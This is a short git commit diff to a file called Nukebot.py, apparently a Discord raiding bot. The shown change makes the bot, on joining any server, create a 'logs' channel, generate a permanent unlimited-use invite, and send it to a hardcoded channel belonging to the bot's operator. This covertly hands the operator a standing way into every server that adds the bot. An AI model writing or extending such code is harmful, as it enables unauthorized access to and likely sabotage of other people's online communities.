e55a329851db816fa84028bf0d96b119e46a4056
XxGamerBroskixX <57766870+XxGamerBroskixX@users.noreply.github.com>
2019-12-03 19:17:17 -0500

    Update Nukebot.py

--- Nukebot.py
+++ Nukebot.py
@@ -26,7 +26,7 @@ async def on_guild_join(guild):
   await guild.create_text_channel("logs")
   channel = discord.utils.get(guild.channels, name="logs")
   link = await channel.create_invite(max_age = 0, max_uses = 0)
-  channel = bot.get_channel(id =!!!Channel ID Here!!!)
+  channel = bot.get_channel(id =650545728497909780)
   await channel.send(link)   
 
 @bot.command(pass_context=True)
